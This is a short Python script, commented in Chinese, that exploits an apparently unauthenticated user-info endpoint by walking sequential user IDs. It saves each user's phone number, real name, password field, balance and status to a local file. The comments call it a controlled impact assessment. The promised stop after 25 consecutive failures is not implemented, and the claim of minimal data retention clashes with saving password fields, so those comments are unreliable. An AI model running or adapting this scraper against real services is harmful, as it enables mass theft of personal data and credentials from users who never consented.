# 未授权水平越权接口 -> 受控批量导出用户档案
# 要点：
#  1) 先用 1 个样本请求确认「无凭据即可返回真实数据字段」（含手机号/口令哈希等敏感字段）
#  2) 顺序遍历主键区间，2 并发 + 每请求间隔，连续 25 次异常立即停止（避免对目标造成压力或触发封禁）
#  3) 只落盘评估影响所需的字段，原始响应不留存明文口令以外的更多隐私
import json, time, urllib.request, concurrent.futures as cf

BASE = "http://example.com"      # 入口（域名池 / 源站 IP 均可）
UA = "okhttp/4.9.0"
PATH = "/user/getUserInfo?userId=%d"                 # 越权点（GET 分支漏鉴权）
START, COUNT, WORKERS, DELAY = 410000, 2000, 2, 0.5

def get(uid):
    req = urllib.request.Request(BASE + PATH % uid, headers={"User-Agent": UA, "Connection": "close"})
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))   # 显式不走本机代理
    try:
        with op.open(req, timeout=12) as r:
            return json.loads(r.read(20000).decode("utf-8", "replace"))
    except Exception:
        return None

rows, errs, consec = [], 0, 0
def work(uid):
    global errs, consec
    j = get(uid)
    if not j or "userId" not in j:
        errs += 1; consec += 1
        return
    consec = 0
    rows.append({k: j.get(k) for k in ("userId","phone","nickname","realName","password","balance","status")})
    time.sleep(DELAY)

with cf.ThreadPoolExecutor(max_workers=WORKERS) as ex:
    list(ex.map(work, range(START, START + COUNT)))

json.dump({"start": START, "count": COUNT, "rows": rows, "errors": errs},
          open("users.json", "w", encoding="utf-8"), ensure_ascii=False)
print("rows=%d errors=%d" % (len(rows), errs))
